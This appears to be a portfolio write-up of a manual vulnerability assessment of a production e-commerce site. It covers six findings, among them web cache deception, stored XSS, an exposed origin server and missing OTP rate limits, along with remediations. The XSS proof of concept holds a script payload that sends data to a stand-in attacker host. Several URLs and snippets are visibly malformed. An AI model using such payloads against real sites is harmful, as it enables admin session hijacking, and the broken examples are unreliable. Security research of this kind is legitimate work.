# Real-World Web Application & Infrastructure Vulnerability Assessment

## Overview
This repository documents a targeted, manual vulnerability assessment performed against a live, production-grade E-Commerce platform in Nepal (`targetapp.com.np`). The web application utilizes a modern tech stack consisting of **Next.js (React)**, a self-hosted **Express.js API gateway**, a **MongoDB** data store, and handles production routing and security behind a **Cloudflare CDN/WAF**. 

Rather than relying on automated noise, this assessment focuses on **6 high-impact logical, architectural, and infrastructure vulnerabilities** that directly threaten data privacy, administrative control, and proxy state integrity.

---

## Executive Summary of Findings


| Identifier | Vulnerability Name | Severity | Primary Impact |
| :--- | :--- | :--- | :--- |
| **VULN-001** | Web Cache Deception via Path Extension | **High (7.5)** | Authenticated cross-origin private data leakage |
| **VULN-002** | Stored Cross-Site Scripting (XSS) via API Form | **Critical (8.6)** | Complete administrative session hijacking |
| **VULN-003** | Exposed Backend Origin Server | **Critical (9.1)** | Total Cloudflare WAF and DDoS protection bypass |
| **VULN-004** | Missing Rate Limiting on OTP Gateway | **High (7.1)** | API throttling bypass & SMS infrastructure exhaustion |
| **VULN-005** | Sensitive Data Leakage via Product API | **Medium (6.5)** | Internal admin credentials and structural ID exposure |
| **VULN-006** | Sequential MongoDB ObjectId Enumeration | **Medium (4.5)** | Predictable product/inventory mapping via BSON IDs |

---

## Detailed Technical Breakdowns

### VULN-001: Web Cache Deception via Path Extension
* **Severity**: High (CVSS 7.5)
* **Mechanics**: The intermediate Cloudflare CDN proxy was configured to cache static resources (`.js`, `.css`) for 4 hours based on path extensions. However, the downstream Express.js server ignored trailing path extensions on REST endpoints. 
* **Proof of Concept (PoC)**: 
  Navigating to `https://targetapp.com.np` forced Cloudflare to parse the route as a static asset, returning an edge `cf-cache-status: MISS` on the first load, followed by a persistent `HIT` on subsequent loads.
* **Impact**: An attacker can craft a malicious link targeting authenticated users. Once clicked, the victim's private profile JSON data is cached at the CDN edge and accessible to unauthenticated public requests.

### VULN-002: Stored Cross-Site Scripting (XSS) via API Form
* **Severity**: Critical (CVSS 8.6)
* **Mechanics**: The `/api/contact` endpoint accepted raw, un-sanitized string inputs inside the `message` payload. This input was committed directly into the MongoDB document layer without encoding or structural filtration.
* **Proof of Concept (PoC)**:
  ```json
  POST /api/contact
  {
    "name": "Security Researcher",
    "message": "<script>fetch('https://attacker.com)</script>"
  }
  ```
* **Impact**: When an administrative user opened the message log inside the React-based management portal, the execution scope evaluated the stored payload, enabling session token hijacking and full administrative account takeover.

### VULN-003: Exposed Backend Origin Server
* **Severity**: Critical (CVSS 9.1)
* **Mechanics**: Passive subdomain mapping and DNS enumeration revealed that the application's underlying backend API gateway was directly exposed to the public internet via an un-proxied origin subdomain (`://targetcommerce.com`).
* **Proof of Concept (PoC)**:
  ```bash
  curl -sI https://://targetcommerce.com/api/home
  # Returns direct HTTP 200 responses with backend framework headers exposed
  ```
* **Impact**: Complete mitigation bypass. An attacker can route automated exploits, brute-force requests, and layer-7 DDoS traffic directly at the origin IP space, rendering Cloudflare's WAF and rate-limiting infrastructure useless.

### VULN-004: Missing Rate Limiting on OTP Gateway
* **Severity**: High (CVSS 7.1)
* **Mechanics**: The `/auth/forget-password` gateway failed to implement sliding-window rate limiting or automated challenge-response tokens (CAPTCHAs) on country-coded mobile endpoint requests (`+977`).
* **Impact**: Attackers can run automated credential enumeration loops or flood the SMS carrier gateway, causing massive financial infrastructure exhaustion for the target company and credential harvesting vectors against users.

### VULN-005: Sensitive Data Leakage via Product API
* **Severity**: Medium (CVSS 6.5)
* **Mechanics**: Publicly available product data endpoints fetched whole data structures from the database collection without applying selective field masking or data serialization filters.
* **Proof of Concept (PoC)**:
  Querying a public product slug returned an unmasked `update_history` object containing the internal administrator's master email account address and active server reference IDs.
* **Impact**: Targeted phishing infrastructure building and precise parameter identification for structural IDOR (Insecure Direct Object Reference) testing.

### VULN-006: Sequential MongoDB ObjectId Enumeration
* **Severity**: Medium (CVSS 4.5)
* **Mechanics**: The system relied on standard, timestamp-ordered MongoDB ObjectIds for indexing resources. Because the ObjectIds decoded to exact sequential generation timestamps, the collection growth pattern was entirely predictable.
* **Impact**: Competitors or scrapers can determine the exact velocity of product additions, total order counts, and system metrics by evaluating the range differences between ObjectIds across chronological timelines.

---

## Methodology & Defensive Remediation
All testing was executed using manual intercepting proxies (Burp Suite Professional) and custom Python verification tools to prevent operational downtime. 

### Key Recommendations Implemented:
1. **Edge Cache Hardening**: Implemented absolute Cloudflare cache rules stating `Cache-Control: no-store` on all variable `/api/*` dynamic JSON frameworks, completely overriding path-extension deception vectors.
2. **Context-Aware Output Encoding**: Integrated strict server-side HTML entity encoding and sanitization hooks to strip code blocks before persistence layers.
3. **Origin Isolation**: Configured local cloud firewalls to explicitly drop all incoming non-Cloudflare traffic at the origin load balancer layer.

---
*Disclaimer: This documentation is hosted strictly for educational and portfolio demonstration purposes. All structural security testing followed a strict ethical code, utilizing sandboxed environments or validated reporting pipelines with no active exploitation or system degradation performed.*
